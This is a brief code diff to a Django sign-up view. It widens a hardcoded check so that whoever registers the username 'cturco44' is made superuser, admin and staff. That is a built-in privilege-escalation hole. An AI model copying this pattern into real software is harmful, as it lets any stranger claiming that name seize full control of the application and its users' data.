@@ -23,8 +23,10 @@ def sign_up(request):
     except:
         return Response(status=status.HTTP_400_BAD_REQUEST)
     
-    if user.username == "cturco":
+    if user.username == "cturco44":
         user.superuser = True
+        user.admin = True
+        user.staff = True
         user.save()
     token = Token.objects.get_or_create(user=user)[0].key
     return Response({"token": token}, status.HTTP_200_OK)
